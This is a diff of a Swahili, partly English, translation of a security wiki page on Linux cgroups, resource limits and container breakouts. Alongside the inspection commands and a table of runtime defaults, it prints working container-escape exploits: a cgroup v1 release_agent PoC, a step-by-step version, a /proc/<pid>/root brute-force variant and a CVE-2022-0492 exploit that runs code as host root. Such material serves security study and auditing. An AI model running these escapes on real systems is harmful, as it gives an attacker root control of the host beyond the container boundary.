@@ -4,73 +4,73 @@
 
 ## Muhtasari
 
-Linux **control groups** ni mekanismo ya kernel inayotumika kuunganisha michakato pamoja kwa ajili ya uhasibu, kuweka mipaka, kupewa kipaumbele, na utekelezaji wa sera. Ikiwa namespaces zinahusu zaidi kutenganisha mtazamo wa rasilimali, cgroups zinahusu zaidi kusimamia **ni kiasi gani** cha rasilimali hizo kundi la michakato linaweza kutumia na, katika baadhi ya kesi, **ni aina gani za rasilimali** ambazo wanaweza kuingiliana nazo kabisa. Containers hutegemea cgroups kila wakati, hata wakati mtumiaji hasioni moja kwa moja, kwa sababu karibu kila runtime ya kisasa inahitaji njia ya kusema kwa kernel "michakato hizi ni za workload hii, na hizi ndizo kanuni za rasilimali zinazowahusu".
+Linux **control groups** ni mekanismo ya kernel inayotumika kuunganisha michakato pamoja kwa ajili ya uhasibu, kupunguza, kipaumbele, na utekelezaji wa sera. Ikiwa namespaces zinahusu zaidi kutenganisha mtazamo wa rasilimali, cgroups zinafaidika zaidi katika kudhibiti **ni kiasi gani** cha rasilimali hizo seti ya michakato inaweza kutumia na, katika baadhi ya kesi, **ni aina gani za rasilimali** wanazoweza kuingiliana nazo kabisa. Containers zinategemea cgroups kila wakati, hata pale mtumiaji asipotazama moja kwa moja, kwa sababu karibu kila runtime ya kisasa inahitaji njia ya kumwambia kernel "michakato hii inamilikiwa na workload hii, na hizi ndizo sheria za rasilimali zinazowahusu".
 
-Hii ndiyo sababu engine za container huweka container mpya ndani ya cgroup subtree yake. Mara tu mti wa michakato uko hapo, runtime inaweza kuweka mipaka ya kumbukumbu, kuzuia idadi ya PIDs, kuipa uzito matumizi ya CPU, kusimamia I/O, na kupunguza ufikiaji wa vifaa. Katika mazingira ya uzalishaji, hii ni muhimu kwa usalama wa multi-tenant na kwa usafi wa uendeshaji. Container bila udhibiti madhubuti wa rasilimali inaweza kumaliza kumbukumbu, kujaza mfumo kwa michakato mingi, au kutawala matumizi ya CPU na I/O kwa njia zinazoweza kufanya host au workloads jirani zisistabili.
+Hivyo ndiyo sababu engines za container huweka container mpya katika cgroup subtree yake mwenyewe. Mara mti wa michakato uko huko, runtime inaweza kuweka kikomo cha memory, kupunguza idadi ya PIDs, kuipa uzito matumizi ya CPU, kudhibiti I/O, na kuzuia ufikivu wa vifaa. Katika mazingira ya uzalishaji, hili ni muhimu kwa usalama wa multi-tenant na kwa usafi wa uendeshaji wa kawaida. Container bila udhibiti mzuri wa rasilimali inaweza kumaliza memory, kuzidisha mfumo kwa michakato mingi, au kujiwekea monopo kwenye CPU na I/O kwa njia zinazoifanya host au workloads jirani kuwa tete.
 
-Kutoka kwa mtazamo wa usalama, cgroups zina umuhimu kwa njia mbili tofauti. Kwanza, mipaka duni au isiyokuwepo ya rasilimali huruhusu mashambulizi ya denial-of-service kwa urahisi. Pili, baadhi ya vipengele vya cgroup, hasa katika usanidi wa zamani wa **cgroup v1**, kihistoria vimeunda powerful breakout primitives pale zilipokuwa zinaweza kuandikwa kutoka ndani ya container.
+Kwa mtazamo wa usalama, cgroups ni muhimu kwa njia mbili tofauti. Kwanza, vizingiti vibaya au vinavyokosekana vya rasilimali vinawezesha mashambulizi ya denial-of-service kwa urahisi. Pili, baadhi ya vipengele vya cgroup, hasa katika usanidi wa zamani wa **cgroup v1**, kihistoria vimeunda breakout primitives zenye nguvu wakati zilikuwa zinaweza kuandikwa kutoka ndani ya container.
 
 ## v1 Vs v2
 
-Kuna mifano miwili muhimu ya cgroup inayotumika. **cgroup v1** inaonyesha hierarchies nyingi za controller, na exploit writeups za zamani mara nyingi zinazunguka semantics zisizo za kawaida na wakati mwingine zenye nguvu kupita kiasi zinazopatikana hapo. **cgroup v2** inaleta hierarchy yenye umoja zaidi na tabia safi zaidi kwa ujumla. Distributions za kisasa zinaongezeka kuipa kipaumbele cgroup v2, lakini mazingira mchanganyiko au ya legacy bado yapo, ambayo ina maana kwamba modeli zote mbili bado zinafaa wakati unapoangalia mifumo halisi.
+Kuna miundo miwili kuu ya cgroup inayotumika. **cgroup v1** inaonyesha hierarchies nyingi za controller, na maelezo ya exploits ya zamani mara nyingi yanazunguka semantiki zisizo za kawaida na wakati mwingine zenye nguvu kupita kiasi zinazopatikana huko. **cgroup v2** inaleta hierarchy iliyounganishwa zaidi na mwenendo safi kwa ujumla. Matoleo ya kisasa ya Linux yanazidi kupendelea cgroup v2, lakini mazingira mchanganyiko au ya urithi bado yapo, ambayo ina maana kwamba miundo yote miwili bado ni muhimu wakati wa kukagua mifumo halisi.
 
-Tofauti hiyo ni muhimu kwa sababu baadhi ya simulizi maarufu za container breakout, kama matumizi mabaya ya **`release_agent`** katika cgroup v1, zinahusishwa sana na tabia za zamani za cgroup. Msomaji ambaye anaona cgroup exploit kwenye blogu kisha bila kuchunguza anaiweka kwenye mfumo wa kisasa wa cgroup v2-only ana uwezekano wa kutoelewa kile kinachoweza kutendeka kwa lengo hilo.
+Tofauti ina umuhimu kwa sababu baadhi ya hadithi maarufu za breakout za container, kama vile matumizi mabaya ya **`release_agent`** katika cgroup v1, zimeunganishwa sana na tabia za zamani za cgroup. Msomaji anayekiangalia exploit ya cgroup kwenye blogu kisha kuitumia bila kufikiri kwenye mfumo wa kisasa unaotumia tu cgroup v2 ana uwezekano mkubwa wa kuelewa vibaya kile kinachoweza kutendeka kwenye lengo.
 
 ## Ukaguzi
 
-Njia ya haraka kuona wapi shell yako ya sasa iko ni:
+Njia ya haraka ya kuona ni wapi shell yako ya sasa iko ni:
 ```bash
 cat /proc/self/cgroup
 findmnt -T /sys/fs/cgroup
 ```
-Faili `/proc/self/cgroup` inaonyesha njia za cgroup zinazohusishwa na mchakato wa sasa. Katika host ya kisasa ya cgroup v2, mara nyingi utaona kipengele kimoja kilichounganishwa. Kwenye host za zamani au za mseto, unaweza kuona njia nyingi za controller za v1. Ukijua njia, unaweza kuchunguza faili zinazolingana chini ya `/sys/fs/cgroup` ili kuona mipaka na matumizi ya sasa.
+Faili `/proc/self/cgroup` inaonyesha njia za cgroup zinazohusiana na mchakato wa sasa. Kwenye host ya kisasa ya cgroup v2, mara nyingi utaona ingizo moja lililounganishwa. Kwenye host za zamani au za mchanganyiko, unaweza kuona njia nyingi za controller za v1. Mara utakapojua njia, unaweza kuchunguza mafaili yanayofanana chini ya `/sys/fs/cgroup` ili kuona mipaka na matumizi ya sasa.
 
-Kwenye host ya cgroup v2, amri zifuatazo ni za manufaa:
+Kwenye host ya cgroup v2, amri zifuatazo ni muhimu:
 ```bash
 ls -l /sys/fs/cgroup
 cat /sys/fs/cgroup/cgroup.controllers
 cat /sys/fs/cgroup/cgroup.subtree_control
 ```
-Faili hizi zinaonyesha ni controllers gani zipo na ni zipi zimepeanwa kwa child cgroups. Mfumo huu wa ugawaji una umuhimu katika mazingira ya rootless na yaliyosimamiwa na systemd, ambapo runtime inaweza kuwa na uwezo wa kudhibiti tu sehemu ndogo ya utendaji wa cgroups ambayo hierarki ya mzazi kwa kweli imepeana.
+Faili hizi zinaonyesha ni controllers gani zipo na ni zipi zilizoteuliwa kwa child cgroups. Mfumo huu wa uteuzi ni muhimu katika mazingira ya rootless na yaliyoendeshwa na systemd, ambapo runtime inaweza kudhibiti tu sehemu ya utendaji ya cgroup ambayo hierarki ya mzazi kwa kweli imeiteua.
 
 ## Maabara
 
-Njia moja ya kuangalia cgroups vitakavyofanya kazi ni kuendesha container iliyo na ukomo wa kumbukumbu:
+Njia moja ya kuona cgroups kwa vitendo ni kuendesha container yenye ukomo wa kumbukumbu:
 ```bash
 docker run --rm -it --memory=256m debian:stable-slim bash
 cat /proc/self/cgroup
 cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
 ```
-Unaweza pia kujaribu kontena yenye kikomo cha PID:
+Unaweza pia kujaribu PID-limited container:
 ```bash
 docker run --rm -it --pids-limit=64 debian:stable-slim bash
 cat /sys/fs/cgroup/pids.max 2>/dev/null
 ```
-Mifano hii ni muhimu kwa sababu husaidia kuunganisha runtime flag na kiolesura cha faili cha kernel. Runtime haitekelezi sheria kwa uchawi; inaandika mipangilio husika ya cgroup kisha ikiacha kernel ifanye utekelezaji dhidi ya process tree.
+These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.
 
-## Matumizi ya Runtime
+## Runtime Usage
 
-Docker, Podman, containerd, na CRI-O wote hutegemea cgroups kama sehemu ya operesheni ya kawaida. Tofauti kwa kawaida sio kuhusu kama wanatumia cgroups, bali kuhusu **default gani wanazochagua**, **jinsi wanavyoshirikiana na systemd**, **jinsi rootless delegation inavyofanya kazi**, na **mara ngapi usanidi unadhibitiwa kwenye ngazi ya engine ikilinganishwa na ngazi ya orchestration**.
+Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. The differences are usually not about whether they use cgroups, but about **which defaults they choose**, **how they interact with systemd**, **how rootless delegation works**, and **how much of the configuration is controlled at the engine level versus the orchestration level**.
 
-Katika Kubernetes, resource requests na limits hatimaye zinakuwa cgroup configuration kwenye node. Njia kutoka Pod YAML hadi kernel enforcement inapitia kubelet, CRI runtime, na OCI runtime, lakini cgroups bado ni mekanisma ya kernel inayotekeleza sheria mwisho. Katika mazingira ya Incus/LXC, cgroups pia zinatumiwa sana, hasa kwa sababu system containers mara nyingi huonyesha process tree yenye rasilimali zaidi na matarajio ya uendeshaji yanayofanana na VM.
+In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.
 
-## Usanidi Mbaya na Kutoroka
+## Misconfigurations And Breakouts
 
-Hadithi ya kawaida ya usalama ya cgroup ni mekanismo inayoandikwa **cgroup v1 `release_agent`**. Katika mfano huo, kama mshambuliaji angeweza kuandika kwenye faili sahihi za cgroup, kuwezesha `notify_on_release`, na kudhibiti path iliyohifadhiwa katika `release_agent`, kernel ingeweza kumaliza kwa kutekeleza path iliyochaguliwa na mshambuliaji katika initial namespaces kwenye host wakati cgroup ilipopata kuwa tupu. Hii ndiyo sababu maelezo ya zamani yalikuwa yakizingatia sana uwezo wa kuandika kwenye controller ya cgroup, chaguo za mount, na vigezo vya namespace/capability.
+The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.
 
-Hata wakati `release_agent` haipo, makosa ya cgroup bado yana umuhimu. Upatikanaji mpana wa vifaa unaweza kufanya vifaa vya host kupatikana kutoka container. Kukosa limits za memory na PID kunaweza kugeuza utekelezaji wa msimbo rahisi kuwa DoS kwa host. Delegation dhaifu ya cgroup katika mazingira ya rootless pia inaweza kudanganya walinzi wakidhani kuna marufuku wakati runtime haikuwa kabisa na uwezo wa kuiweka.
+Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.
 
-### `release_agent` Historia
+### `release_agent` Background
 
-Mbinu ya `release_agent` inatumika tu kwa **cgroup v1**. Wazo msingi ni kwamba wakati mchakato wa mwisho katika cgroup anatoa exit na `notify_on_release=1` imewekwa, kernel inatekeleza programu yenye path iliyohifadhiwa katika `release_agent`. Utekelezaji huo hufanyika katika **initial namespaces on the host**, ambayo ndiyo inafanya `release_agent` inayoweza kuandikwa kuwa primitive ya kutoroka kutoka container.
+The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.
 
-Ili mbinu ifanye kazi, mshambuliaji kwa kawaida anahitaji:
+For the technique to work, the attacker generally needs:
 
-- hierarki inayoweza kuandikwa ya **cgroup v1**
-- uwezo wa kuunda au kutumia child cgroup
-- uwezo wa kuweka `notify_on_release`
-- uwezo wa kuandika path ndani ya `release_agent`
-- path inayotatua kuwa executable kutoka upande wa host
+- a writable **cgroup v1** hierarchy
+- the ability to create or use a child cgroup
+- the ability to set `notify_on_release`
+- the ability to write a path into `release_agent`
+- a path that resolves to an executable from the host point of view
 
 ### Classic PoC
 
@@ -91,25 +91,25 @@ sh -c "echo 0 > $d/w/cgroup.procs"
 sleep 1
 cat /o
 ```
-PoC hii inaandika path ya payload ndani ya `release_agent`, inachochea uachili wa cgroup, kisha inasoma tena faili ya output iliyotengenezwa kwenye host.
+PoC hii inaandika njia ya payload ndani ya `release_agent`, inasababisha uachishaji wa cgroup, na kisha inasoma tena faili ya pato iliyotengenezwa kwenye host.
 
-### Mwongozo Rahisi wa Kusomeka
+### Maelezo ya Hatua kwa Hatua
 
-Wazo lile linaeleweka kwa urahisi zaidi linapogawanywa katika hatua.
+Wazo lilelile linaeleweka kwa urahisi linapogawanywa katika hatua.
 
-1. Tengeneza na uandae cgroup inayoweza kuandikwa:
+1. Unda na uandae cgroup inayoweza kuandikwa:
 ```bash
 mkdir /tmp/cgrp
 mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
 mkdir /tmp/cgrp/x
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
-2. Tambua njia ya mwenyeji inayolingana na mfumo wa faili wa kontena:
+2. Tambua host path inayolingana na container filesystem:
 ```bash
 host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
-3. Weka payload ambayo itaonekana kutoka host path:
+3. Weka payload itakayoweza kuonekana kutoka kwenye njia ya mwenyeji:
 ```bash
 cat <<'EOF' > /cmd
 #!/bin/sh
@@ -117,17 +117,17 @@ ps aux > /output
 EOF
 chmod +x /cmd
 ```
-4. Chochea utekelezaji kwa kufanya cgroup iwe tupu:
+4. Chochea utekelezaji kwa kufanya cgroup kuwa tupu:
 ```bash
 sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
 sleep 1
 cat /output
 ```
-The effect is host-side execution of the payload with host root privileges. In a real exploit, the payload usually writes a proof file, spawns a reverse shell, or modifies host state.
+Athari ni utekelezaji upande wa mwenyeji wa payload kwa ruhusa za root za mwenyeji. Katika exploit halisi, payload kawaida huandika faili ya ushahidi, huanzisha reverse shell, au hubadilisha hali ya mwenyeji.
 
-### Relative Path Variant Using `/proc/<pid>/root`
+### Variant ya Relative Path Kutumia `/proc/<pid>/root`
 
-Kwenye mazingira fulani, host path kwa filesystem ya container si wazi au imefichwa na storage driver. Katika kesi hiyo, payload path inaweza kuonyeshwa kupitia `/proc/<pid>/root/...`, ambapo `<pid>` ni host PID inayomilikiwa na mchakato ndani ya container ya sasa. Hii ndiyo msingi wa relative-path brute-force variant:
+Kwenye mazingira mengine, njia ya mwenyeji kuelekea filesystem ya container si dhahiri au imefichwa na driver wa uhifadhi. Katika hali hiyo njia ya payload inaweza kuonyeshwa kupitia `/proc/<pid>/root/...`, ambapo `<pid>` ni PID ya mwenyeji inayomilikiwa na mchakato katika container ya sasa. Hii ndio msingi wa toleo la brute-force la relative-path:
 ```bash
 #!/bin/sh
 
@@ -175,11 +175,11 @@ done
 sleep 1
 cat ${OUTPUT_PATH}
 ```
-Mbinu muhimu hapa si brute force yenyewe bali fomu ya njia: `/proc/<pid>/root/...` inamwezesha kernel kutatua faili ndani ya filesystem ya container kutoka kwenye host namespace, hata wakati njia ya uhifadhi ya host haijulikani kabla.
+Mbinu muhimu hapa si brute force yenyewe bali muundo wa path: `/proc/<pid>/root/...` inaiwezesha kernel kutatua faili ndani ya container filesystem kutoka host namespace, hata wakati direct host storage path haijulikani mapema.
 
-### CVE-2022-0492 Tofauti
+### CVE-2022-0492 Variant
 
-Mnamo 2022, CVE-2022-0492 ilionyesha kwamba kuandika kwenye `release_agent` katika cgroup v1 hakukagua kwa usahihi uwepo wa `CAP_SYS_ADMIN` katika **awali** user namespace. Hii ilifanya mbinu hiyo iwe rahisi kufikiwa kwenye kernels zilizo na udhaifu, kwa sababu mchakato ndani ya container ulioweza ku-mount hierarchy ya cgroup ungeweza kuandika `release_agent` bila kuwa tayari na ruhusa kwenye host user namespace.
+Mwaka 2022, CVE-2022-0492 ilionyesha kwamba kuandika kwa `release_agent` katika cgroup v1 hakukuwa ukikagua ipasavyo kwa ajili ya `CAP_SYS_ADMIN` katika **initial** user namespace. Hii ilifanya technique hii iwe rahisi kufikiwa zaidi kwenye vulnerable kernels kwa sababu container process iliyoweza mount cgroup hierarchy iliweza kuandika `release_agent` bila kuwa tayari privileged katika host user namespace.
 
 Minimal exploit:
 ```bash
@@ -193,9 +193,9 @@ echo /proc/self/exe > /tmp/c/release_agent
 while true; do sleep 1; done
 '
 ```
-Kwenye kernel dhaifu, host huendesha `/proc/self/exe` kwa ruhusa za root za host.
+Katika kernel yenye udhaifu, host hufanya `/proc/self/exe` kwa vibali vya root za host.
 
-Kwa matumizi ya vitendo, anza kwa kuangalia kama mazingira bado yanaonyesha njia za cgroup-v1 zinazoweza kuandikwa au upatikanaji wa vifaa hatarishi:
+Kwa matumizi ya vitendo, anza kwa kuangalia ikiwa mazingira bado yanaonyesha njia za cgroup-v1 zinazoweza kuandikwa au ufikiaji wa kifaa hatari:
 ```bash
 mount | grep cgroup
 find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
@@ -207,38 +207,39 @@ Ikiwa `release_agent` ipo na inaweza kuandikwa, tayari uko katika eneo la legacy
 find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
 find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
 ```
-Ikiwa njia ya cgroup yenyewe haitoi kutoroka, matumizi yafuatayo ya vitendo mara nyingi ni denial of service au reconnaissance:
+Ikiwa njia ya cgroup yenyewe haisababisha escape, matumizi yanayofuata ya vitendo mara nyingi huwa denial of service au reconnaissance:
 ```bash
 cat /sys/fs/cgroup/pids.max 2>/dev/null
 cat /sys/fs/cgroup/memory.max 2>/dev/null
 cat /sys/fs/cgroup/cpu.max 2>/dev/null
 ```
-Amri hizi zinakuambia kwa haraka ikiwa workload ina nafasi ya kufanya fork-bomb, kutumia kumbukumbu kwa nguvu, au kutumia vibaya kiolesura cha cgroup cha urithi kinachoweza kuandikwa.
+Hizi amri zinaonyesha kwa haraka ikiwa workload ina nafasi ya kufanya fork-bomb, kutumia kumbukumbu kwa ukali, au kuutumia vibaya kiolesura cha zamani cha cgroup kinachoweza kuandikwa.
 
-## Ukaguzi
+## Checks
 
-Unapotathmini lengo, kusudio la ukaguzi wa cgroup ni kujifunza ni modeli gani ya cgroup inatumiwa, ikiwa container inaona njia za controller zinazoweza kuandikwa, na ikiwa primitive za zamani za breakout kama `release_agent` zina umuhimu.
+Wakati unapotathmini lengo, kusudi la cgroup checks ni kujifunza ni modeli gani ya cgroup inayotumika, ikiwa container inaona writable controller paths, na ikiwa breakout primitives za zamani kama `release_agent` zinaweza hata kuwa muhimu.
 ```bash
 cat /proc/self/cgroup                                      # Current process cgroup placement
 mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
 find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
 cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
 ```
-What is interesting here:
+Kinachovutia hapa:
 
-- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
-- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
-- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.
+- Ikiwa `mount | grep cgroup` inaonyesha **cgroup v1**, breakout writeups za zamani zinakuwa muhimu zaidi.
+- Ikiwa `release_agent` ipo na inafikika, hiyo inastahili uchunguzi wa kina mara moja.
+- Ikiwa hieraki ya cgroup inayonekana inaweza kuandikwa na container pia ina capabilities kali, mazingira yanastahili mapitio ya karibu zaidi.
 
-If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.
+Ikiwa ugundue **cgroup v1**, writable controller mounts, na container ambayo pia ina capabilities kali au ulinzi dhaifu wa seccomp/AppArmor, mchanganyiko huo unastahili umakini makini. cgroups mara nyingi hutendewa kama mada ya kuchosha ya usimamizi wa rasilimali, lakini kihistoria imekuwa sehemu ya baadhi ya container escape chains zinazofundisha zaidi hasa kwa sababu mpaka kati ya "resource control" na "host influence" haukuwa safi kama watu walidhani.
 
-## Runtime Defaults
+## Mipangilio chaguo-msingi ya Runtime
 
-| Runtime / platform | Default state | Default behavior | Common manual weakening |
+| Runtime / platform | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Udhoofishaji wa kawaida (kwa mkono) |
 | --- | --- | --- | --- |
-| Docker Engine | Imewezeshwa kwa chaguo-msingi | Containers zinapangwa kwenye cgroups kiotomatiki; mipaka ya rasilimali ni hiari isipokuwa imewekwa kwa flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
-| Podman | Imewezeshwa kwa chaguo-msingi | `--cgroups=enabled` ndiyo chaguo-msingi; cgroup namespace chaguo-msingi hutofautiana kwa toleo la cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
-| Kubernetes | Imewezeshwa kupitia runtime kwa chaguo-msingi | Pods na containers zimesambazwa kwenye cgroups na node runtime; udhibiti wa rasilimali wa kina hutegemea `resources.requests` / `resources.limits` | omitting resource requests/limits, privileged device access, host-level runtime misconfiguration |
-| containerd / CRI-O | Imewezeshwa kwa chaguo-msingi | cgroups ni sehemu ya usimamizi wa lifecycle wa kawaida | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |
+| Docker Engine | Imewezeshwa chaguo-msingi | Containers zinawekwa katika cgroups kiotomatiki; mipaka ya rasilimali ni hiari isipokuwa imewekwa kwa flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
+| Podman | Imewezeshwa chaguo-msingi | `--cgroups=enabled` ni default; cgroup namespace defaults zinatofautiana kwa toleo la cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, upatikanaji wa device uliorahisishwa, `--privileged` |
+| Kubernetes | Imewezeshwa kupitia runtime chaguo-msingi | Pods na containers zimewekwa katika cgroups na runtime ya node; udhibiti wa rasilimali kwa undani hutegemea `resources.requests` / `resources.limits` | kutojumuisha resource requests/limits, ufikiaji wa device uliopewa ruhusa za juu, misconfiguration ya runtime ngazi ya host |
+| containerd / CRI-O | Imewezeshwa chaguo-msingi | cgroups ni sehemu ya usimamizi wa lifecycle wa kawaida | runtime configs za moja kwa moja zinazopunguza udhibiti wa device au kufunua writable cgroup v1 interfaces |
 
-The important distinction is that **cgroup existence** is usually default, while **useful resource constraints** are often optional unless explicitly configured.
+Tofauti muhimu ni kwamba **uwepo wa cgroup** kawaida ni chaguo-msingi, wakati **vikwazo vinavyotumika vya rasilimali** mara nyingi ni hiari isipokuwa vimewekwa kwa uwazi.
+{{#include ../../../../banners/hacktricks-training.md}}
